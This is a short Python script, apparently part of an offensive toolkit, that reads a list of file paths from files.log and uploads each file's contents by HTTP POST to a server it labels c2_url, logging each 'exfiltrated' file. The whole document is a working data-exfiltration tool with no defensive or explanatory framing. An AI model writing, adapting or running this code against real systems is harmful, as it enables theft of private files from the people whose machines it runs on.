import os
import requests

def exfiltrate_file(file_path, url):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        headers = {
            'Filename': os.path.basename(file_path),
            'Content-Type': 'application/octet-stream'
        }

        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            print(f"[+] Exfiltrated: {file_path}")
        else:
            print(f"[!] Failed to exfiltrate {file_path}: {response.status_code}")
    except Exception as e:
        print(f"[!] Error sending {file_path}: {e}")

def run_exfiltration(log_file="files.log", c2_url="http://localhost:8080"):
    if not os.path.exists(log_file):
        print("[-] files.log not found.")
        return

    with open(log_file, "r") as f:
        file_paths = f.readlines()

    for path in file_paths:
        filepath = path.strip()
        if os.path.exists(filepath):
            exfiltrate_file(filepath, c2_url)
        else:
            print(f"[-] Skipped missing file: {filepath}")

if __name__ == "__main__":
    run_exfiltration()
